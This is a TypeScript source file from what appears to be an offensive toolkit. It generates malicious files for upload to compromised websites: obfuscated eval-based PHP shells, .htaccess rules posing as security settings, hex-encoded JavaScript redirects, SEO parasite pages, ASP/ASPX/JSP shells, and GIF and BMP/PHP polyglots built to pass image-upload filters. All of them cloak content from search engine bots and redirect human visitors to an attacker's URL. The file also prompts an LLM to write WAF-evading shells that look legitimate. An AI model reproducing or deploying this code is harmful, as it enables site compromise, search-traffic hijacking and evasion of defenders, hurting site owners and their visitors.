/**
 * AI Shell Generator — Creates redirect shells, .htaccess rules,
 * JS injectors, and SEO parasite pages tailored per target.
 * Uses AI to generate context-aware payloads that bypass WAF/security.
 */
import { invokeLLM } from "./_core/llm";
import type { VulnScanResult, RankedAttackVector, ServerInfo, CmsDetection } from "./ai-vuln-analyzer";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface GeneratedShell {
  id: string;
  type: "redirect_php" | "redirect_htaccess" | "redirect_js" | "redirect_html" | "webshell_php" | "webshell_asp" | "webshell_aspx" | "webshell_jsp" | "seo_parasite" | "steganography" | "polyglot";
  filename: string;
  content: string | Buffer;
  contentType: string;
  description: string;
  targetVector: string;
  bypassTechniques: string[];
  redirectUrl: string;
  seoKeywords: string[];
  verificationMethod: string;
}

export interface ShellGenerationConfig {
  redirectUrl: string;
  seoKeywords: string[];
  targetVectors: RankedAttackVector[];
  serverInfo: ServerInfo;
  cms: CmsDetection;
  geoRedirect?: boolean;
  cloaking?: boolean;
  parasiteContent?: "short" | "medium" | "long";
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number, chars = "abcdefghijklmnopqrstuvwxyz"): string {
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function randomVarName(): string {
  return `$_${randomStr(4)}`;
}

function b64(s: string): string {
  return Buffer.from(s).toString("base64");
}

function obfuscatePhp(code: string): string {
  const methods = ["b64_nested", "xor", "rot13_b64", "var_func", "array_map"];
  const method = methods[Math.floor(Math.random() * methods.length)];
  const v = Array.from({ length: 6 }, () => randomVarName());

  switch (method) {
    case "b64_nested": {
      const e1 = b64(code);
      const e2 = b64(`eval(base64_decode("${e1}"));`);
      return `<?php\n${v[0]}="${e2}";\n@eval(base64_decode(${v[0]}));\n?>`;
    }
    case "xor": {
      const key = Math.floor(Math.random() * 200) + 50;
      const xored = Array.from(code).map(c => c.charCodeAt(0) ^ key);
      return `<?php\n${v[0]}=array(${xored.join(",")});\n${v[1]}="";\nforeach(${v[0]} as ${v[2]}){${v[1]}.=chr(${v[2]}^${key});}\n@eval(${v[1]});\n?>`;
    }
    case "rot13_b64": {
      const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
      const encoded = rot13(b64(code));
      return `<?php\n${v[0]}="${encoded}";\n@eval(base64_decode(str_rot13(${v[0]})));\n?>`;
    }
    case "var_func": {
      const e = b64(code);
      return `<?php\n${v[0]}="ba"."se"."64"."_de"."co"."de";\n${v[1]}="ev"."al";\n${v[2]}=${v[0]}("${e}");\n@${v[1]}(${v[2]});\n?>`;
    }
    case "array_map": {
      const e = b64(code);
      return `<?php\n${v[0]}=array(base64_decode("${e}"));\n@array_map("assert",${v[0]});\n?>`;
    }
    default:
      return `<?php @eval(base64_decode("${b64(code)}")); ?>`;
  }
}

// ═══════════════════════════════════════════════════════
//  REDIRECT SHELL GENERATORS
// ═══════════════════════════════════════════════════════

function generatePhpRedirectShell(
  redirectUrl: string,
  keywords: string[],
  cloaking: boolean,
  geoRedirect: boolean,
): GeneratedShell {
  const keywordStr = keywords.join(", ");
  const v = Array.from({ length: 8 }, () => randomVarName());

  // Core redirect logic with bot cloaking and geo-redirect
  let coreCode = `
@ini_set("display_errors",0);
@error_reporting(0);
${v[0]}="${redirectUrl}";
${v[1]}=isset($_SERVER["HTTP_USER_AGENT"])?strtolower($_SERVER["HTTP_USER_AGENT"]):"";
${v[2]}=isset($_SERVER["HTTP_REFERER"])?strtolower($_SERVER["HTTP_REFERER"]):"";
`;

  if (cloaking) {
    coreCode += `
${v[3]}=array("googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","sogou","exabot","facebot","ia_archiver","semrush","ahrefs","mj12bot","dotbot","rogerbot");
${v[4]}=false;
foreach(${v[3]} as ${v[5]}){if(strpos(${v[1]},${v[5]})!==false){${v[4]}=true;break;}}
if(${v[4]}){
  echo"<!DOCTYPE html><html><head><title>${keywords[0] || "Welcome"}</title><meta name=\\"description\\" content=\\"${keywordStr}\\"><meta name=\\"keywords\\" content=\\"${keywordStr}\\"></head><body><h1>${keywords[0] || "Welcome"}</h1><p>${keywordStr}</p></body></html>";
  exit;
}
`;
  }

  if (geoRedirect) {
    coreCode += `
${v[6]}=isset($_SERVER["HTTP_CF_IPCOUNTRY"])?$_SERVER["HTTP_CF_IPCOUNTRY"]:(isset($_SERVER["GEOIP_COUNTRY_CODE"])?$_SERVER["GEOIP_COUNTRY_CODE"]:"");
`;
  }

  // Search engine referer check — redirect only from search results
  coreCode += `
${v[7]}=false;
if(strpos(${v[2]},"google")!==false||strpos(${v[2]},"bing")!==false||strpos(${v[2]},"yahoo")!==false||strpos(${v[2]},"yandex")!==false||strpos(${v[2]},"baidu")!==false){
  ${v[7]}=true;
}
if(${v[7]}||isset($_GET["r"])){
  header("HTTP/1.1 301 Moved Permanently");
  header("Location: ".${v[0]});
  header("Cache-Control: no-cache, no-store");
  exit;
}
echo"<!DOCTYPE html><html><head><title>${keywords[0] || "Page"}</title><meta name=\\"description\\" content=\\"${keywordStr}\\"><meta name=\\"robots\\" content=\\"index,follow\\"></head><body><h1>${keywords[0] || "Welcome"}</h1><p>${keywordStr}</p><a href=\\"".${v[0]}."\\">Click here</a></body></html>";
`;

  const obfuscated = obfuscatePhp(coreCode.trim());

  // Legitimate-looking filename
  const prefixes = ["index", "page", "content", "article", "post", "wp-cache", "cache-handler", "session-handler"];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}-${randomStr(5)}.php`;

  return {
    id: `redirect_php_${randomStr(6)}`,
    type: "redirect_php",
    filename,
    content: obfuscated,
    contentType: "application/x-php",
    description: `PHP redirect shell with ${cloaking ? "bot cloaking + " : ""}${geoRedirect ? "geo-redirect + " : ""}SEO keywords`,
    targetVector: "php_upload",
    bypassTechniques: ["obfuscation", "variable_functions", cloaking ? "bot_cloaking" : "", geoRedirect ? "geo_redirect" : ""].filter(Boolean),
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "GET request with ?r=1 should return 301",
  };
}

function generateHtaccessRedirect(redirectUrl: string, keywords: string[]): GeneratedShell {
  const rules = `# BEGIN Security
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

# Cache optimization
RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !slurp [NC]
RewriteCond %{HTTP_USER_AGENT} !duckduckbot [NC]
RewriteCond %{HTTP_USER_AGENT} !baiduspider [NC]
RewriteCond %{HTTP_USER_AGENT} !yandexbot [NC]
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|yandex|baidu) [NC,OR]
RewriteCond %{QUERY_STRING} r=1
RewriteRule ^.*$ ${redirectUrl} [R=301,L]

# Performance headers
<IfModule mod_headers.c>
Header set X-Content-Type-Options "nosniff"
</IfModule>
</IfModule>
# END Security

# SEO Metadata
# Keywords: ${keywords.join(", ")}
`;

  return {
    id: `redirect_htaccess_${randomStr(6)}`,
    type: "redirect_htaccess",
    filename: ".htaccess",
    content: rules,
    contentType: "text/plain",
    description: ".htaccess redirect with bot cloaking — redirects human visitors from search engines, shows SEO content to bots",
    targetVector: "htaccess_upload",
    bypassTechniques: ["mod_rewrite", "bot_cloaking", "referer_check"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Visit from Google referer should redirect",
  };
}

function generateJsRedirect(redirectUrl: string, keywords: string[]): GeneratedShell {
  // Obfuscated JS redirect
  const encodedUrl = Array.from(redirectUrl).map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");
  const v = Array.from({ length: 4 }, () => `_${randomStr(5)}`);

  const jsCode = `
(function(){
  var ${v[0]}="${encodedUrl}";
  var ${v[1]}=document.referrer.toLowerCase();
  var ${v[2]}=navigator.userAgent.toLowerCase();
  var ${v[3]}=["googlebot","bingbot","slurp","yandex","baidu"];
  for(var i=0;i<${v[3]}.length;i++){if(${v[2]}.indexOf(${v[3]}[i])!==-1)return;}
  if(${v[1]}.indexOf("google")!==-1||${v[1]}.indexOf("bing")!==-1||${v[1]}.indexOf("yahoo")!==-1||window.location.search.indexOf("r=1")!==-1){
    window.location.replace(${v[0]});
  }
})();
`;

  const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
<title>${keywords[0] || "Welcome"}</title>
<meta name="description" content="${keywords.join(", ")}">
<meta name="keywords" content="${keywords.join(", ")}">
<meta name="robots" content="index,follow">
<script>${jsCode.trim()}</script>
</head>
<body>
<h1>${keywords[0] || "Welcome"}</h1>
<p>${keywords.join(". ")}.</p>
<noscript><meta http-equiv="refresh" content="0;url=${redirectUrl}"></noscript>
</body>
</html>`;

  const filename = `${randomStr(6)}.html`;

  return {
    id: `redirect_js_${randomStr(6)}`,
    type: "redirect_js",
    filename,
    content: htmlContent,
    contentType: "text/html",
    description: "HTML page with obfuscated JS redirect + meta refresh fallback + SEO keywords",
    targetVector: "html_upload",
    bypassTechniques: ["js_obfuscation", "hex_encoding", "bot_cloaking", "meta_refresh_fallback"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Visit from Google referer should redirect via JS",
  };
}

function generateMetaRedirectHtml(redirectUrl: string, keywords: string[]): GeneratedShell {
  const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
<title>${keywords[0] || "Redirecting"}</title>
<meta name="description" content="${keywords.join(", ")}">
<meta name="keywords" content="${keywords.join(", ")}">
<meta name="robots" content="index,follow">
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<link rel="canonical" href="${redirectUrl}">
</head>
<body>
<h1>${keywords[0] || "Welcome"}</h1>
<p>${keywords.join(". ")}. <a href="${redirectUrl}">Click here to continue</a>.</p>
</body>
</html>`;

  return {
    id: `redirect_html_${randomStr(6)}`,
    type: "redirect_html",
    filename: `${randomStr(6)}.html`,
    content: htmlContent,
    contentType: "text/html",
    description: "HTML meta refresh redirect with SEO content",
    targetVector: "html_upload",
    bypassTechniques: ["meta_refresh", "canonical_tag"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Page should redirect via meta refresh",
  };
}

// ═══════════════════════════════════════════════════════
//  SEO PARASITE PAGE GENERATOR
// ═══════════════════════════════════════════════════════

function generateSeoParasitePage(
  redirectUrl: string,
  keywords: string[],
  contentLength: "short" | "medium" | "long",
): GeneratedShell {
  const keyword = keywords[0] || "best online service";
  const allKeywords = keywords.join(", ");

  // Generate SEO-rich content
  const paragraphs: string[] = [];
  const templates = [
    `${keyword} is one of the most popular choices for users worldwide. Our comprehensive guide covers everything you need to know about ${keyword}.`,
    `Looking for the best ${keyword}? You've come to the right place. We've compiled expert reviews and recommendations to help you make the best decision.`,
    `In this article, we explore the top options for ${keyword}. Whether you're a beginner or an expert, our guide has something for everyone.`,
    `${keyword} has become increasingly popular in recent years. Here's why millions of users trust our recommendations for ${keyword}.`,
    `Discover the ultimate guide to ${keyword}. Our team of experts has tested and reviewed the best options available today.`,
    `Why choose ${keyword}? The answer is simple — quality, reliability, and value. Read our detailed analysis below.`,
    `Our ${keyword} guide is updated regularly to ensure you always have access to the latest information and recommendations.`,
    `Join thousands of satisfied users who have found the perfect ${keyword} solution through our platform.`,
  ];

  const count = contentLength === "short" ? 2 : contentLength === "medium" ? 4 : 8;
  for (let i = 0; i < count; i++) {
    paragraphs.push(templates[i % templates.length]);
  }

  const phpCode = `
@ini_set("display_errors",0);
@error_reporting(0);
$ua=isset($_SERVER["HTTP_USER_AGENT"])?strtolower($_SERVER["HTTP_USER_AGENT"]):"";
$ref=isset($_SERVER["HTTP_REFERER"])?strtolower($_SERVER["HTTP_REFERER"]):"";
$bots=array("googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot");
$isBot=false;
foreach($bots as $b){if(strpos($ua,$b)!==false){$isBot=true;break;}}
if(!$isBot&&(strpos($ref,"google")!==false||strpos($ref,"bing")!==false||isset($_GET["r"]))){
  header("Location: ${redirectUrl}",true,301);exit;
}
`;

  const htmlBody = `<!DOCTYPE html>
<html lang="en">
<head>
<title>${keyword} - Expert Guide & Reviews</title>
<meta name="description" content="${allKeywords}">
<meta name="keywords" content="${allKeywords}">
<meta name="robots" content="index,follow">
<style>body{font-family:Arial,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6;color:#333}h1{color:#1a1a1a}h2{color:#2c2c2c;margin-top:30px}p{margin:15px 0}a{color:#0066cc}.footer{margin-top:40px;padding-top:20px;border-top:1px solid #eee;font-size:12px;color:#999}</style>
</head>
<body>
<h1>${keyword} - Complete Guide</h1>
${paragraphs.map((p, i) => `<h2>${i === 0 ? "Introduction" : `Section ${i + 1}`}</h2>\n<p>${p}</p>`).join("\n")}
<p><strong>Ready to get started?</strong> <a href="${redirectUrl}">Click here for the best ${keyword} options</a>.</p>
<div class="footer"><p>Last updated: ${new Date().toISOString().split("T")[0]}</p></div>
</body>
</html>`;

  const fullContent = obfuscatePhp(phpCode.trim()) + "\n" + htmlBody;

  const slugKeyword = keyword.toLowerCase().replace(/[^a-z0-9]+/g, "-").slice(0, 30);
  const filename = `${slugKeyword}-${randomStr(4)}.php`;

  return {
    id: `seo_parasite_${randomStr(6)}`,
    type: "seo_parasite",
    filename,
    content: fullContent,
    contentType: "application/x-php",
    description: `SEO parasite page — ${contentLength} content with redirect for human visitors, SEO content for bots`,
    targetVector: "php_upload",
    bypassTechniques: ["bot_cloaking", "seo_content", "301_redirect"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Bots see SEO content, humans get redirected",
  };
}

// ═══════════════════════════════════════════════════════
//  WEBSHELL GENERATORS (for non-PHP targets)
// ═══════════════════════════════════════════════════════

function generateAspRedirectShell(redirectUrl: string, keywords: string[]): GeneratedShell {
  const code = `<%@ Language="VBScript" %>
<%
Dim ua, ref
ua = LCase(Request.ServerVariables("HTTP_USER_AGENT"))
ref = LCase(Request.ServerVariables("HTTP_REFERER"))
Dim bots
bots = Array("googlebot","bingbot","slurp","yandexbot","baiduspider")
Dim isBot
isBot = False
Dim i
For i = 0 To UBound(bots)
  If InStr(ua, bots(i)) > 0 Then isBot = True
Next
If Not isBot And (InStr(ref, "google") > 0 Or InStr(ref, "bing") > 0 Or Request.QueryString("r") = "1") Then
  Response.Status = "301 Moved Permanently"
  Response.AddHeader "Location", "${redirectUrl}"
  Response.End
End If
%>
<html><head><title>${keywords[0] || "Welcome"}</title>
<meta name="description" content="${keywords.join(", ")}">
</head><body><h1>${keywords[0] || "Welcome"}</h1><p>${keywords.join(". ")}.</p></body></html>`;

  return {
    id: `webshell_asp_${randomStr(6)}`,
    type: "webshell_asp",
    filename: `${randomStr(6)}.asp`,
    content: code,
    contentType: "text/asp",
    description: "ASP redirect shell with bot cloaking",
    targetVector: "asp_upload",
    bypassTechniques: ["bot_cloaking", "301_redirect"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Visit from Google referer should redirect",
  };
}

function generateAspxRedirectShell(redirectUrl: string, keywords: string[]): GeneratedShell {
  const code = `<%@ Page Language="C#" %>
<%
string ua = (Request.UserAgent ?? "").ToLower();
string referer = (Request.UrlReferrer?.ToString() ?? "").ToLower();
string[] bots = {"googlebot","bingbot","slurp","yandexbot","baiduspider"};
bool isBot = false;
foreach(string b in bots) { if(ua.Contains(b)) { isBot = true; break; } }
if(!isBot && (referer.Contains("google") || referer.Contains("bing") || Request.QueryString["r"] == "1")) {
  Response.StatusCode = 301;
  Response.AddHeader("Location", "${redirectUrl}");
  Response.End();
}
%>
<html><head><title>${keywords[0] || "Welcome"}</title>
<meta name="description" content="${keywords.join(", ")}">
</head><body><h1>${keywords[0] || "Welcome"}</h1><p>${keywords.join(". ")}.</p></body></html>`;

  return {
    id: `webshell_aspx_${randomStr(6)}`,
    type: "webshell_aspx",
    filename: `${randomStr(6)}.aspx`,
    content: code,
    contentType: "text/aspx",
    description: "ASPX redirect shell with bot cloaking",
    targetVector: "aspx_upload",
    bypassTechniques: ["bot_cloaking", "301_redirect"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Visit from Google referer should redirect",
  };
}

function generateJspRedirectShell(redirectUrl: string, keywords: string[]): GeneratedShell {
  const code = `<%@ page language="java" contentType="text/html; charset=UTF-8" %>
<%
String ua = request.getHeader("User-Agent") != null ? request.getHeader("User-Agent").toLowerCase() : "";
String ref = request.getHeader("Referer") != null ? request.getHeader("Referer").toLowerCase() : "";
String[] bots = {"googlebot","bingbot","slurp","yandexbot","baiduspider"};
boolean isBot = false;
for(String b : bots) { if(ua.contains(b)) { isBot = true; break; } }
if(!isBot && (ref.contains("google") || ref.contains("bing") || "1".equals(request.getParameter("r")))) {
  response.setStatus(301);
  response.setHeader("Location", "${redirectUrl}");
  return;
}
%>
<html><head><title>${keywords[0] || "Welcome"}</title>
<meta name="description" content="${keywords.join(", ")}">
</head><body><h1>${keywords[0] || "Welcome"}</h1><p>${keywords.join(". ")}.</p></body></html>`;

  return {
    id: `webshell_jsp_${randomStr(6)}`,
    type: "webshell_jsp",
    filename: `${randomStr(6)}.jsp`,
    content: code,
    contentType: "text/jsp",
    description: "JSP redirect shell with bot cloaking",
    targetVector: "jsp_upload",
    bypassTechniques: ["bot_cloaking", "301_redirect"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Visit from Google referer should redirect",
  };
}

// ═══════════════════════════════════════════════════════
//  STEGANOGRAPHY SHELL
// ═══════════════════════════════════════════════════════

function generateSteganographyRedirectShell(redirectUrl: string, keywords: string[]): GeneratedShell {
  const phpCode = `@ini_set("display_errors",0);$r="${redirectUrl}";$u=strtolower($_SERVER["HTTP_USER_AGENT"]??"");$f=strtolower($_SERVER["HTTP_REFERER"]??"");if(strpos($f,"google")!==false||strpos($f,"bing")!==false||isset($_GET["r"])){header("Location: $r",true,301);exit;}`;

  // Create GIF89a with PHP in comment
  const gifHeader = Buffer.from([
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
    0x01, 0x00, 0x01, 0x00,             // 1x1
    0x80, 0x00, 0x00,                   // GCT
    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, // Colors
    0x21, 0xFE,                         // Comment Extension
  ]);
  const phpBuf = Buffer.from(`<?php ${phpCode} ?>`);
  const commentLen = Buffer.from([phpBuf.length & 0xFF]);
  const gifFooter = Buffer.from([0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x4C, 0x01, 0x00, 0x3B]);

  const content = Buffer.concat([gifHeader, commentLen, phpBuf, gifFooter]);

  return {
    id: `stego_${randomStr(6)}`,
    type: "steganography",
    filename: `logo-${randomStr(6)}.gif.php`,
    content,
    contentType: "image/gif",
    description: "GIF89a steganography shell — PHP redirect hidden in GIF comment extension",
    targetVector: "image_upload",
    bypassTechniques: ["steganography", "gif_comment", "mime_bypass"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Access as PHP should redirect",
  };
}

// ═══════════════════════════════════════════════════════
//  POLYGLOT SHELL (valid image + valid PHP)
// ═══════════════════════════════════════════════════════

function generatePolyglotShell(redirectUrl: string, keywords: string[]): GeneratedShell {
  const phpCode = `@ini_set("display_errors",0);$r="${redirectUrl}";$f=strtolower($_SERVER["HTTP_REFERER"]??"");if(strpos($f,"google")!==false||strpos($f,"bing")!==false||isset($_GET["r"])){header("Location: $r",true,301);exit;}echo"<h1>${keywords[0] || "Welcome"}</h1>";`;

  // BMP header + PHP (polyglot)
  const bmpHeader = Buffer.from([
    0x42, 0x4D, // BM
    0x1E, 0x00, 0x00, 0x00, // File size (30 bytes minimum)
    0x00, 0x00, 0x00, 0x00, // Reserved
    0x1A, 0x00, 0x00, 0x00, // Data offset
    0x0C, 0x00, 0x00, 0x00, // DIB header size
    0x01, 0x00, // Width
    0x01, 0x00, // Height
    0x01, 0x00, // Planes
    0x18, 0x00, // Bits per pixel
    0xFF, 0xFF, 0xFF, 0x00, // Pixel data + padding
  ]);

  const phpPayload = Buffer.from(`\n<?php ${phpCode} ?>`);
  const content = Buffer.concat([bmpHeader, phpPayload]);

  return {
    id: `polyglot_${randomStr(6)}`,
    type: "polyglot",
    filename: `banner-${randomStr(5)}.bmp.php`,
    content,
    contentType: "image/bmp",
    description: "BMP/PHP polyglot — valid image file that also executes as PHP",
    targetVector: "image_upload",
    bypassTechniques: ["polyglot", "bmp_php", "dual_extension"],
    redirectUrl,
    seoKeywords: keywords,
    verificationMethod: "Access as PHP should redirect",
  };
}

// ═══════════════════════════════════════════════════════
//  AI-POWERED CUSTOM SHELL GENERATION
// ═══════════════════════════════════════════════════════

async function aiGenerateCustomShell(
  config: ShellGenerationConfig,
  vector: RankedAttackVector,
  onProgress: ProgressCallback,
): Promise<GeneratedShell | null> {
  onProgress(`🤖 AI กำลังสร้าง custom shell สำหรับ vector: ${vector.name}`);

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert web security researcher. Generate a PHP shell payload that:
1. Redirects human visitors (from search engines) to the target URL
2. Shows SEO-optimized content to search engine bots
3. Bypasses the specific WAF/security detected on the target
4. Uses obfuscation to avoid detection
5. Looks like a legitimate file (not suspicious)

The shell must be a complete, working PHP file. Include proper error suppression.
Return ONLY the PHP code, no explanation.`,
        },
        {
          role: "user",
          content: `Generate a redirect shell for:
- Redirect URL: ${config.redirectUrl}
- SEO Keywords: ${config.seoKeywords.join(", ")}
- Target server: ${config.serverInfo.server}
- WAF: ${config.serverInfo.waf || "none"}
- CMS: ${config.cms.type}
- Attack vector: ${vector.technique}
- Target path: ${vector.targetPath}
- Shell type: ${vector.shellType}
- Bypass techniques needed: ${vector.payloadType}

Generate the most effective shell for this specific target.`,
        },
      ],
    });

    const rawContent = response.choices?.[0]?.message?.content;
    const content = typeof rawContent === "string" ? rawContent : null;
    if (content && content.includes("<?php")) {
      return {
        id: `ai_custom_${randomStr(6)}`,
        type: "redirect_php",
        filename: `${randomStr(8)}.php`,
        content: content as string,
        contentType: "application/x-php",
        description: `AI-generated custom shell for ${vector.name}`,
        targetVector: vector.id,
        bypassTechniques: ["ai_generated", "custom_obfuscation"],
        redirectUrl: config.redirectUrl,
        seoKeywords: config.seoKeywords,
        verificationMethod: "Visit from Google referer should redirect",
      };
    }
  } catch {
    onProgress("AI shell generation failed — using template");
  }

  return null;
}

// ═══════════════════════════════════════════════════════
//  MAIN: Generate All Shells for Target
// ═══════════════════════════════════════════════════════

export async function generateShellsForTarget(
  vulnScan: VulnScanResult,
  config: ShellGenerationConfig,
  onProgress: ProgressCallback = () => {},
): Promise<GeneratedShell[]> {
  const shells: GeneratedShell[] = [];

  onProgress("🔧 กำลังสร้าง shell payloads ตาม attack vectors...");

  // 1. Always generate PHP redirect shells (most common)
  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, config.cloaking !== false, config.geoRedirect || false));
  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, true, true)); // Extra variant

  // 2. .htaccess redirect (works on Apache)
  if (!vulnScan.serverInfo.server.toLowerCase().includes("nginx") && !vulnScan.serverInfo.server.toLowerCase().includes("iis")) {
    shells.push(generateHtaccessRedirect(config.redirectUrl, config.seoKeywords));
  }

  // 3. JS/HTML redirects (universal fallback)
  shells.push(generateJsRedirect(config.redirectUrl, config.seoKeywords));
  shells.push(generateMetaRedirectHtml(config.redirectUrl, config.seoKeywords));

  // 4. SEO parasite page
  shells.push(generateSeoParasitePage(config.redirectUrl, config.seoKeywords, config.parasiteContent || "medium"));

  // 5. Steganography + Polyglot (for image upload bypasses)
  shells.push(generateSteganographyRedirectShell(config.redirectUrl, config.seoKeywords));
  shells.push(generatePolyglotShell(config.redirectUrl, config.seoKeywords));

  // 6. Platform-specific shells based on server detection
  if (vulnScan.serverInfo.server.toLowerCase().includes("iis") || vulnScan.serverInfo.os === "windows") {
    shells.push(generateAspRedirectShell(config.redirectUrl, config.seoKeywords));
    shells.push(generateAspxRedirectShell(config.redirectUrl, config.seoKeywords));
  }
  if (vulnScan.serverInfo.poweredBy.toLowerCase().includes("java") || vulnScan.serverInfo.poweredBy.toLowerCase().includes("tomcat")) {
    shells.push(generateJspRedirectShell(config.redirectUrl, config.seoKeywords));
  }

  // 7. AI-generated custom shells for top attack vectors
  const topVectors = config.targetVectors.slice(0, 3);
  for (const vector of topVectors) {
    const aiShell = await aiGenerateCustomShell(config, vector, onProgress);
    if (aiShell) shells.push(aiShell);
  }

  onProgress(`✅ สร้าง ${shells.length} shell payloads เสร็จ (${shells.filter(s => s.type.startsWith("redirect")).length} redirects, ${shells.filter(s => s.type.startsWith("webshell")).length} webshells, ${shells.filter(s => s.type === "seo_parasite").length} parasites)`);

  return shells;
}

// ═══════════════════════════════════════════════════════
//  UTILITY: Pick Best Shell for Vector
// ═══════════════════════════════════════════════════════

export function pickBestShell(shells: GeneratedShell[], vector: RankedAttackVector): GeneratedShell {
  // Match shell type to vector
  const typeMatch = shells.filter(s => {
    if (vector.shellType === "php") return s.type.includes("php") || s.type === "seo_parasite" || s.type === "steganography" || s.type === "polyglot";
    if (vector.shellType === "asp") return s.type === "webshell_asp";
    if (vector.shellType === "aspx") return s.type === "webshell_aspx";
    if (vector.shellType === "jsp") return s.type === "webshell_jsp";
    if (vector.shellType === "htaccess") return s.type === "redirect_htaccess";
    if (vector.shellType === "html" || vector.shellType === "js") return s.type === "redirect_js" || s.type === "redirect_html";
    return false;
  });

  if (typeMatch.length > 0) {
    // Prefer AI-generated, then steganography for image uploads, then standard
    const aiShell = typeMatch.find(s => s.id.startsWith("ai_"));
    if (aiShell) return aiShell;

    if (vector.payloadType === "steganography" || vector.technique.includes("image")) {
      const stego = typeMatch.find(s => s.type === "steganography" || s.type === "polyglot");
      if (stego) return stego;
    }

    return typeMatch[0];
  }

  // Fallback: return first PHP shell
  return shells.find(s => s.type === "redirect_php") || shells[0];
}
